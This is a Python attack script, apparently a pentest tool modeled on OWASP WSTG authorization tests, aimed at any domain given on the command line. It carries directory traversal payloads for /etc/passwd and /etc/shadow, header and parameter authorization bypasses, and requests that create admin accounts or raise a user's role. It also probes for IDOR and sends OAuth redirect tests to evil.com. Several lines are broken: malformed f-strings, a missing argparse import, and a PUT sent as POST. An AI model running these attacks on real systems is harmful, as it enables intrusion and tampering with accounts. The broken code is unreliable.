#!/usr/bin/env python3
"""
OWASP WSTG Authorization Testing Framework (WSTG-ATHZ)
Autor: Framework OWASP WSTG
Propósito: Automatizar pruebas de Authorization Testing con integración de herramientas Kali

Uso: python authorization_tester.py --target <domain.com>
"""

import sys
import os
import re
import json
import time
import random
import string
import base64
import logging
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs
import requests
from bs4 import BeautifulSoup
import concurrent.futures

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.base_tester import BaseTester, TestResult
from core.utils import SecurityUtils
from core.kali_tools import get_kali_tools_instance

logger = logging.getLogger(__name__)

class AuthorizationTester(BaseTester):
    """Tester especializado para Authorization Testing (WSTG-ATHZ)"""

    def __init__(self, target: str, config: dict = None):
        super().__init__(target, config)

        # Configuración específica
        self.auth_token = self.config.get('auth_token', None)
        self.session_cookie = self.config.get('session_cookie', None)

        # Herramientas de Kali
        self.kali_tools = get_kali_tools_instance(self.config)

        # Resultados específicos
        self.authz_findings = {
            'directory_traversal': {},
            'authorization_bypass': {},
            'privilege_escalation': {},
            'idor_vulnerabilities': {},
            'oauth_weaknesses': {}
        }

    def get_phase_id(self) -> str:
        return 'WSTG-ATHZ'

    def get_phase_name(self) -> str:
        return 'Authorization Testing'

    def run_tests(self) -> bool:
        print(f"\n{'='*60}")
        print(f"OWASP WSTG - Authorization Testing Framework")
        print(f"Target: {self.target}")
        print(f"{'='*60}")

        try:
            # WSTG-ATHZ-01: Directory Traversal Testing
            self.test_wstg_athz_01()

            # WSTG-ATHZ-02: Authorization Schema Bypass
            self.test_wstg_athz_02()

            # WSTG-ATHZ-03: Privilege Escalation
            self.test_wstg_athz_03()

            # WSTG-ATHZ-04: Insecure Direct Object References
            self.test_wstg_athz_04()

            # WSTG-ATHZ-05: OAuth Weaknesses
            self.test_wstg_athz_05()

            return True

        except Exception as e:
            logger.error(f"Error en ejecución de pruebas de autorización: {e}")
            return False

    def test_wstg_athz_01(self):
        """WSTG-ATHZ-01: Testing Directory Traversal File Include"""
        print("\n[+] WSTG-ATHZ-01: Directory Traversal Testing")

        results = {
            'vulnerable_endpoints': [],
            'tested_payloads': 0,
            'successful_exploits': []
        }

        # Payloads de directory traversal
        traversal_payloads = [
            # Unix paths
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../proc/version",
            "../../../etc/hosts",
            "../../../etc/shadow",

            # Windows paths
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\boot.ini",
            "..\\..\\..\\..\\windows\\win.ini",

            # Encoding variations
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",

            # Variations con null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",

            # UTF-8 overlong
            "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%afetc%c0%afpasswd",

            # Path confusion
            "....//....//....//etc/passwd",
            "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        ]

        # Endpoint comunes para probar
        test_endpoints = [
            "/download.php",
            "/view.php",
            "/file.php",
            "/document.php",
            "/image.php",
            "/include.php",
            "/load.php",
            "/preview.php",
            "/show.php",
            "/render.php"
        ]

        # Parámetros comunes
        parameters = ["file", "page", "document", "include", "load", "view", "image"]

        for endpoint in test_endpoints:
            for param in parameters:
                for payload in traversal_payloads[:5]:  # Limitar payload para testing rápido
                    results['tested_payloads'] += 1

                    url = f"{self.target_info.base_url}{endpoint}?{param}={payload}"

                    try:
                        response = self.make_request('GET', url)

                        if response and response.status_code == 200:
                            # Verificar si se obtuvo contenido de archivo
                            if self._is_file_content(response.text, payload):
                                exploit_info = {
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'response_preview': response.text[:200]
                                }

                                results['vulnerable_endpoints'].append(exploit_info)
                                results['successful_exploits'].append(exploit_info)

                                self.add_vulnerability(
                                    'WSTG-ATHZ-01-DIR-TRAVERSAL',
                                    f'Directory Traversal en {endpoint} - parámetro: {param}',
                                    exploit_info,
                                    'critical',
                                    'CWE-22'
                                )
                                print(f"    [!] Directory Traversal encontrado: {url}")
                                break

                    except Exception as e:
                        logger.debug(f"Error probando payload {payload}: {e}")

                    time.sleep(0.1)  # Pequeña pausa

        if not results['successful_exploits']:
            print("    [+] No se detectaron vulnerabilidades de Directory Traversal")

        self.authz_findings['directory_traversal'] = results

    def _is_file_content(self, content, payload):
        """Verifica si el contenido corresponde a un archivo del sistema"""
        if not content:
            return False

        # Indicadores de archivos de sistema
        system_file_indicators = [
            'root:x:0:0',  # /etc/passwd
            'daemon:x:1:1',
            'bin:x:2:2',
            'for 16-bit app support',
            '[files]',  # Windows .ini
            '[boot loader]',
            'Linux version',
            'processor',
            'MemTotal:'
        ]

        return any(indicator in content for indicator in system_file_indicators)

    def test_wstg_athz_02(self):
        """WSTG-ATHZ-02: Testing for Bypassing Authorization Schema"""
        print("\n[+] WSTG-ATHZ-02: Authorization Schema Bypass Testing")

        results = {
            'bypass_attempts': [],
            'successful_bypasses': [],
            'tested_endpoints': []
        }

        # Endpoints de administración comunes
        admin_endpoints = [
            "/admin",
            "/admin/users",
            "/admin/dashboard",
            "/admin/settings",
            "/admin/config",
            "/admin/logs",
            "/panel",
            "/dashboard",
            "/control",
            "/manage",
            "/settings",
            "/config",
            "/api/admin",
            "/api/admin/users",
            "/api/admin/settings"
        ]

        # Técnicas de bypass
        bypass_techniques = [
            {"method": "param_injection", "payloads": ["?admin=true", "?role=admin", "?bypass=1"]},
            {"method": "header_manipulation", "headers": {"X-Admin": "true", "X-Role": "admin"}},
            {"method": "ip_bypass", "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}}
        ]

        for endpoint in admin_endpoints:
            results['tested_endpoints'].append(endpoint)
            url = urljoin(self.target_info.base_url, endpoint)

            for technique in bypass_techniques:
                try:
                    if technique["method"] == "param_injection":
                        for payload in technique["payloads"]:
                            test_url = url + payload
                            response = self.make_request('GET', test_url)

                            if response and response.status_code == 200:
                                bypass_result = {
                                    'endpoint': endpoint,
                                    'technique': technique["method"],
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'response_preview': response.text[:200]
                                }
                                results['successful_bypasses'].append(bypass_result)

                                self.add_vulnerability(
                                    'WSTG-ATHZ-02-BYPASS-PARAM',
                                    f'Authorization bypass via parameter injection: {endpoint}',
                                    bypass_result,
                                    'high',
                                    'CWE-285'
                                )
                                print(f"    [!] Bypass encontrado: {test_url}")

                    elif technique["method"] == "header_manipulation":
                        headers = technique["headers"].copy()
                        # Agregar headers existentes
                        for key, value in self.session.headers.items():
                            if key not in headers:
                                headers[key] = value

                        response = requests.get(url, headers=headers, timeout=self.default_timeout, verify=False)

                        if response.status_code == 200:
                            bypass_result = {
                                'endpoint': endpoint,
                                'technique': technique["method"],
                                'headers': headers,
                                'status_code': response.status_code
                            }
                            results['successful_bypasses'].append(bypass_result)

                            self.add_vulnerability(
                                'WSTG-ATHZ-02-BYPASS-HEADER',
                                f'Authorization bypass via header manipulation: {endpoint}',
                                bypass_result,
                                'high',
                                'CWE-304'
                            )
                            print(f"    [!] Header bypass encontrado: {endpoint}")

                except Exception as e:
                    logger.debug(f"Error probando bypass en {endpoint}: {e")

        if not results['successful_bypasses']:
            print("    [+] No se detectaron bypasses de autorización")

        self.authz_findings['authorization_bypass'] = results

    def test_wstg_athz_03(self):
        """WSTG-ATHZ-03: Testing for Privilege Escalation"""
        print("\n[+] WSTG-ATHZ-03: Privilege Escalation Testing")

        results = {
            'escalation_attempts': [],
            'successful_escalations': [],
            'user_creation_attempts': []
        }

        # Escenarios de escalada de privilegios
        escalation_scenarios = [
            {
                'name': 'Admin user creation',
                'method': 'POST',
                'endpoint': '/api/users',
                'payload': {
                    'username': f'admin_{random.randint(1000, 9999)}',
                    'email': f'admin_{random.randint(1000, 9999)}@test.com',
                    'password': 'TempPass123!',
                    'role': 'admin'
                }
            },
            {
                'name': 'Role upgrade',
                'method': 'PUT',
                'endpoint': '/api/users/1',  # Intentar modificar primer usuario
                'payload': {
                    'role': 'administrator',
                    'permissions': ['all']
                }
            },
            {
                'name': 'Admin panel access',
                'method': 'GET',
                'endpoint': '/admin/role/grant',
                'payload': {'user_id': '1', 'role': 'admin'}
            }
        ]

        for scenario in escalation_scenarios:
            try:
                url = urljoin(self.target_info.base_url, scenario['endpoint'])

                if scenario['method'] == 'GET':
                    response = requests.get(url, params=scenario['payload'],
                                          timeout=self.default_timeout, verify=False)
                else:
                    response = requests.post(url, json=scenario['payload'],
                                           timeout=self.default_timeout, verify=False)

                if response and response.status_code in [200, 201]:
                    escalation_result = {
                        'scenario': scenario['name'],
                        'endpoint': scenario['endpoint'],
                        'payload': scenario['payload'],
                        'status_code': response.status_code,
                        'response_preview': response.text[:200]
                    }
                    results['successful_escalations'].append(escalation_result)

                    self.add_vulnerability(
                        'WSTG-ATHZ-03-PRIV-ESCALATION',
                        f'Privilege escalation: {scenario["name"]}',
                        escalation_result,
                        'critical',
                        'CWE-269'
                    )
                    print(f"    [!] Escalación de privilegios exitosa: {scenario['name']}")

            except Exception as e:
                logger.debug(f"Error probando escalación {scenario['name']}: {e}")

        if not results['successful_escalations']:
            print("    [+] No se detectaron vulnerabilidades de escalada de privilegios")

        self.authz_findings['privilege_escalation'] = results

    def test_wstg_athz_04(self):
        """WSTG-ATHZ-04: Testing for Insecure Direct Object References (IDOR)"""
        print("\n[+] WSTG-ATHZ-04: IDOR Testing")

        results = {
            'tested_resources': [],
            'vulnerable_resources': [],
            'idor_instances': []
        }

        # Patrones de recursos comunes con IDs
        idor_patterns = [
            {'pattern': r'/api/users/(\d+)', 'type': 'user_profile'},
            {'pattern': r'/api/orders/(\d+)', 'type': 'order'},
            {'pattern': r'/api/invoices/(\d+)', 'type': 'invoice'},
            {'pattern': r'/api/documents/(\d+)', 'type': 'document'},
            {'pattern': r'/profile/(\d+)', 'type': 'profile'},
            {'pattern': r'/download/(\d+)', 'type': 'download'},
            {'pattern': r'/api/messages/(\d+)', 'type': 'message'}
        ]

        # IDs de prueba
        test_ids = [1, 2, 999, 9999, 0, -1, 'admin', 'null']

        for pattern_info in idor_patterns:
            for test_id in test_ids:
                try:
                    # Simular endpoint con ID
                    endpoint = re.sub(r'\(\d+\)', str(test_id), pattern_info['pattern'])
                    url = urljoin(self.target_info.base_url, endpoint)

                    response = self.make_request('GET', url)

                    if response and response.status_code == 200:
                        idor_result = {
                            'resource_type': pattern_info['type'],
                            'endpoint': endpoint,
                            'test_id': test_id,
                            'status_code': response.status_code,
                            'response_preview': response.text[:200]
                        }

                        results['idor_instances'].append(idor_result)

                        # Verificar si contiene datos sensibles de otros usuarios
                        if self._contains_sensitive_data(response.text):
                            results['vulnerable_resources'].append(idor_result)

                            self.add_vulnerability(
                                'WSTG-ATHZ-04-IDOR',
                                f'Insecure Direct Object Reference: {pattern_info["type"]}',
                                idor_result,
                                'high',
                                'CWE-639'
                            )
                            print(f"    [!] IDOR detectado: {endpoint}")

                except Exception as e:
                    logger.debug(f"Error probando IDOR {endpoint}: {e")

        # Usar herramientas de Kali si están disponibles
        if 'web' in self.kali_tools:
            self._test_idor_with_kali_tools()

        if not results['vulnerable_resources']:
            print("    [+] No se detectaron vulnerabilidades IDOR")

        self.authz_findings['idor_vulnerabilities'] = results

    def _contains_sensitive_data(self, content):
        """Verifica si el contenido contiene datos sensibles"""
        sensitive_indicators = [
            'email', 'phone', 'address', 'ssn', 'credit',
            'password', 'token', 'secret', 'key',
            'profile', 'account', 'balance', 'transaction'
        ]

        content_lower = content.lower()
        return any(indicator in content_lower for indicator in sensitive_indicators)

    def _test_idor_with_kali_tools(self):
        """Pruebas IDOR con herramientas de Kali"""
        if 'feroxbuster' in self.kali_tools.get('web', {}):
            print("    [*] Buscando endpoints con IDOR usando Feroxbuster")

            # Buscar patrones numéricos en URLs
            try:
                feroxbuster = self.kali_tools['web']['feroxbuster']
                result = feroxbuster.feroxbuster_scan(
                    target=self.target_info.base_url,
                    wordlist='/usr/share/wordlists/ids.txt',  # Si existe
                    extensions='php,asp,aspx,jsp'
                )

                if result.get('success'):
                    self.add_info(
                        'WSTG-ATHZ-04-FEROXBUSTER-SCAN',
                        'Escaneo con Feroxbuster completado',
                        result
                    )
            except Exception as e:
                logger.error(f"Error con Feroxbuster: {e}")

    def test_wstg_athz_05(self):
        """WSTG-ATHZ-05: Testing for OAuth Weaknesses"""
        print("\n[+] WSTG-ATHZ-05: OAuth Testing")

        results = {
            'oauth_endpoints': [],
            'vulnerabilities': [],
            'tested_configurations': []
        }

        # Endpoints OAuth comunes
        oauth_endpoints = [
            '/oauth/authorize',
            '/oauth/token',
            '/api/oauth/authorize',
            '/auth/oauth2',
            '/oauth2/authorize'
        ]

        for endpoint in oauth_endpoints:
            try:
                url = urljoin(self.target_info.base_url, endpoint)
                response = self.make_request('GET', url)

                if response and response.status_code == 200:
                    results['oauth_endpoints'].append({
                        'endpoint': endpoint,
                        'url': url,
                        'status_code': response.status_code
                    })

                    # Testing de configuración OAuth
                    oauth_tests = self._test_oauth_configuration(url)
                    results['tested_configurations'].append(oauth_tests)

                    # Verificar vulnerabilidades
                    vulnerabilities = self._check_oauth_vulnerabilities(url, oauth_tests)
                    if vulnerabilities:
                        results['vulnerabilities'].extend(vulnerabilities)

                        for vuln in vulnerabilities:
                            self.add_vulnerability(
                                f"WSTG-ATHZ-05-{vuln['type'].upper()}",
                                vuln['description'],
                                vuln,
                                vuln['severity'],
                                vuln['cwe']
                            )
                            print(f"    [!] OAuth vulnerability: {vuln['description']}")

            except Exception as e:
                logger.debug(f"Error probando OAuth endpoint {endpoint}: {e}")

        if not results['vulnerabilities']:
            print("    [+] No se detectaron vulnerabilidades OAuth")

        self.authz_findings['oauth_weaknesses'] = results

    def _test_oauth_configuration(self, oauth_url):
        """Prueba configuración OAuth"""
        tests = []

        # Test 1: Redirect URI manipulation
        malicious_uris = [
            'http://evil.com',
            'https://evil.com',
            'javascript://evil.com',
            'data:text/html,<script>alert(1)</script>'
        ]

        for uri in malicious_uris:
            try:
                params = {
                    'response_type': 'code',
                    'client_id': 'test_client',
                    'redirect_uri': uri,
                    'scope': 'read'
                }

                response = requests.get(oauth_url, params=params, timeout=10, verify=False)
                tests.append({
                    'test': 'redirect_uri_manipulation',
                    'uri': uri,
                    'status_code': response.status_code,
                    'vulnerable': response.status_code not in [400, 401, 403]
                })
            except:
                continue

        # Test 2: Scope manipulation
        dangerous_scopes = [
            'admin write delete read all',
            'read write admin',
            'offline_access'
        ]

        for scope in dangerous_scopes:
            try:
                params = {
                    'response_type': 'code',
                    'client_id': 'test_client',
                    'redirect_uri': 'http://localhost',
                    'scope': scope
                }

                response = requests.get(oauth_url, params=params, timeout=10, verify=False)
                tests.append({
                    'test': 'scope_manipulation',
                    'scope': scope,
                    'status_code': response.status_code,
                    'vulnerable': response.status_code not in [400, 401, 403]
                })
            except:
                continue

        return tests

    def _check_oauth_vulnerabilities(self, oauth_url, tests):
        """Verifica vulnerabilidades OAuth basadas en los tests"""
        vulnerabilities = []

        for test in tests:
            if test['vulnerable']:
                if test['test'] == 'redirect_uri_manipulation':
                    vulnerabilities.append({
                        'type': 'redirect_uri',
                        'description': f'Open redirect in OAuth endpoint: {test["uri"]}',
                        'severity': 'high',
                        'cwe': 'CWE-601',
                        'evidence': test
                    })
                elif test['test'] == 'scope_manipulation':
                    vulnerabilities.append({
                        'type': 'scope_manipulation',
                        'description': f'Scope manipulation possible: {test["scope"]}',
                        'severity': 'medium',
                        'cwe': 'CWE-266',
                        'evidence': test
                    })

        return vulnerabilities

    def save_results(self, output_dir: str = ".", format: str = "both"):
        """Guardar resultados específicos de autorización"""
        super().save_results(output_dir, format)

        # Agregar hallazgos específicos de autorización
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        auth_results_file = f"{output_dir}/authorization_findings_{self.target_info.domain}_{timestamp}.json"

        with open(auth_results_file, 'w', encoding='utf-8') as f:
            json.dump(self.authz_findings, f, indent=2, ensure_ascii=False)

        print(f"[+] Hallazgos de autorización guardados en: {auth_results_file}")

def main():
    parser = argparse.ArgumentParser(description='OWASP WSTG Authorization Testing Framework')
    parser.add_argument('--target', required=True, help='Dominio objetivo (ej: ejemplo.com)')
    parser.add_argument('--auth-token', help='Token de autenticación si se tiene')
    parser.add_argument('--session-cookie', help='Cookie de sesión si se tiene')
    parser.add_argument('--verbose', '-v', action='store_true', help='Modo verbose')

    args = parser.parse_args()

    try:
        config = {
            'auth_token': args.auth_token,
            'session_cookie': args.session_cookie
        }

        tester = AuthorizationTester(args.target, config)
        success = tester.run_tests()

        if success:
            tester.save_results()
            print(f"\n[+] Pruebas de autorización completadas para {args.target}")
        else:
            print(f"\n[!] Error en ejecución de pruebas para {args.target}")

    except KeyboardInterrupt:
        print("\n[!] Prueba interrumpida por el usuario")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()